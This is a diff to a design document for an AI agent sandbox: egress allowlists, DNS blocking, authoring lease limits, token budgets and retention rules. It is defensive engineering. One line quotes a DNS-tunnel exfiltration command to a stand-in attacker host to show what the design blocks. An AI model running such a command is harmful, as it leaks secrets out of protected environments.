@@ -615,7 +615,7 @@ Every base chain accepts by policy and drops only on its own link, so one sandbo
 
 **The merged allowlist.** At lease bind the supervisor merges, deduplicated in first-seen order: the runner's assigned `registry_allowlist`, or, when it is empty, the default registry set (`registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `static.crates.io`, `crates.io`, `index.crates.io`, `proxy.golang.org`, `sum.golang.org`), and the fleet's `network.allow`. A fleet that sets `read_only` keeps its hosts out of the kernel set: nf_tables cannot enforce a method, so those hosts are reached only through `http_request`, whose origin rules can. Each entry is read as a URL's host, under `https://` when it names no scheme, so a scheme, port or path is dropped and `[::1]:80` names `::1`; `http_request` admits by the same reading (`afr_egress::allowlist_host`), so it reaches exactly the hosts the kernel set is built from. The supervisor resolves each name to IPv4 with the host resolver.
 
-**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox, at the base URL the provider registry names ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
+**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox, at the base URL saved for the selected model ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
 
 **Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts`, each allowlist name with its resolved address, and an `/etc/resolv.conf` naming no server, both bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable. That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.
 
@@ -685,7 +685,7 @@ Authoring is creator-private work. Resolve its workspace owner, recheck creator 
 
 Additive migrations 935–942 define creator-private `core.authoring_drafts`, `core.authoring_messages`, candidates and replay receipts; content-free `fleet.authoring_attempts` and dispatch/activity receipts; and independently retained `billing.authoring_settlements`. Immutable native setup/Library revisions join their existing domains. The authoring progress channel is `draft:{draft_id}:events`; its ownership is checked before subscription and every reconnect. No private event joins workspace broadcast. The tables are registered and applied to the local test database. The private channel and stream still require implementation; migrations do not prove their runtime behavior.
 
-Each authoring lease has an attempt identity, fence, deletion generation, expiry, pinned model/tokenizer/prices, and budget. Renewal/report/activity guard all of them. No runtime credential mint, tenant tools, memory, repository checkout, schedule access, or fleet message capability is issued to this lease. Instructions and native setup are untrusted context, never system authority.
+Each authoring lease has an attempt identity, fence, deletion generation, expiry, pinned model/inference settings/context/prices, and budget. Renewal/report/activity guard all of them. No runtime credential mint, tenant tools, memory, repository checkout, schedule access, or fleet message capability is issued to this lease. Instructions and native setup are untrusted context, never system authority.
 
 ### Scoped provider boundary
 
@@ -695,8 +695,8 @@ The daemon issues an opaque lease capability and serves the fourth machine route
 
 | Bound | Value | Enforcement |
 |---|---|---|
-| Input per model call | 32,768 tokens | Selected model tokenizer counts system, tool schemas, bounded history, current text, and candidate excerpts before dispatch. |
-| Output across a turn | 8,192 tokens | Sum provider output over all calls; reserve only remaining output for each next call. |
+| Input per model call | 32,768 tokens | A known model tokenizer counts the assembled request; other configured models reserve one token per UTF-8 byte. Both include system instructions, tool schemas, history and current text. |
+| Output across a turn | Saved model maximum output tokens | Sum provider output over all calls; reserve only remaining output for each next call. |
 | Calls per attempt | 8 | Daemon and runner counters; no tool loop beyond this count. |
 | Wall time per attempt | 300 seconds | Monotonic runner timer plus daemon expiry/fence; timeouts become timed_out. |
 | Provider request | 30 seconds | Request timeout and local abort; upstream cancellation is not assumed confirmed. |
@@ -705,7 +705,7 @@ The daemon issues an opaque lease capability and serves the fourth machine route
 | System / tool schemas | 2,048 /4,096 tokens maximum | Pin assembled prompt version; validate these counts on model eligibility and before each call. |
 | Progress frame / terminal envelope | 4 KiB /128 KiB | Typed bounds before append or spool. |
 
-The model's context window must also cover the counted input plus remaining output reservation. Reject ineligible models rather than choosing a fallback. If context cannot fit, trim only disclosed eligible history with a recorded summary boundary, or fail before calling the provider; never truncate the policy or tool schema. Output includes hidden/reasoning tokens if the provider charges/counts them. Eligibility requires a provider-supported hard output bound and reliable usage semantics. Byte counts cannot prove these caps. Count every physical provider dispatch, including retries, against the call limit; disable hidden SDK retries. An uncertain provider call ends the attempt instead of allowing another call to consume an unknown output remainder.
+The model's context window must also cover the counted input plus remaining output reservation. Reject ineligible models rather than choosing a fallback. If context cannot fit, trim only disclosed eligible history with a recorded summary boundary, or fail before calling the provider; never truncate the policy or tool schema. Output includes hidden/reasoning tokens if the provider charges/counts them. Eligibility requires a provider-supported hard output bound and reliable usage semantics. The byte fallback is deliberately conservative and may refuse a request that a provider-specific tokenizer would fit; provider-reported usage remains authoritative for settlement. Count every physical provider dispatch, including retries, against the call limit; disable hidden SDK retries. An uncertain provider call ends the attempt instead of allowing another call to consume an unknown output remainder.
 
 The model has one proposal tool: initialize once when no candidate exists, then small edits against the candidate ID and revision. Claim includes the current candidate; every proposal acknowledgement returns its accepted version. Exact replay returns that original version, even after later edits. It may ask clarifying questions. It cannot grant access, publish, Save, call arbitrary functions, or choose different credentials. Tool operations pass the same validator as drawer edits. Assistant answer and candidate changes are separate records; terminal report does not re-emit the whole definition.
 
@@ -714,7 +714,7 @@ The model has one proposal tool: initialize once when no candidate exists, then 
 | Copy | Owner | Lifetime and removal |
 |---|---|---|
 | Draft messages and candidates | Creator-private authoring domain | Draft deletion removes private rows and invalidates the deletion generation. |
-| Dispatch result and answer receipts | Authoring domain | Bounded private replay copies expire after 24 hours; accounting receipts retain no answer. |
+| Dispatch result, native provider reply and answer receipts | Authoring domain | Bounded private replay copies expire after 24 hours. Native replies bind the attempt and unchanged conversation prefix, stay out of runner responses and logs, and are cleared with draft deletion. Accounting receipts retain no answer. |
 | Authoring report, temporary files and rejected copies | Supervisor | Private bytes are encrypted with a separate local content key. Logical expiry is 24 hours from first write and survives retry or rename. Cleanup runs during uptime and before any restart content read or upload. |
 | Attempt and settlement records | Runner and billing domains | Retain content-free identities and validated accounting independently of the draft. |
 | Provider logs and infrastructure snapshots | Their service owners | Follow their published retention; draft deletion cannot promise physical removal from these systems. |
